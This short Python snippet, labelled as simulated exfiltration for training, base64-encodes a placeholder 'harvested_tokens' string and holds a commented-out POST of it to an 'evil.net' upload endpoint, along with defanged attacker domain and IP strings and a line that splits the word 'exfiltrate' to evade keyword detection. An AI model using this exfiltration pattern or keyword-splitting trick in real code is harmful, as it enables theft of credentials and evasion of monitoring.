
# Simulated data exfil (training only)
import base64, requests

DOMAIN = "EVIL[.]NET"
ip = "192 [.] 168 [.] 50 [.] 25"
payload = base64.b64encode(b"harvested_tokens").decode()
# pretend POST to C2 (commented)
# requests.post("http://evil.net/upload", data={"p": payload})

print("exf", "i" + "ltr" + "ate")  # split keyword
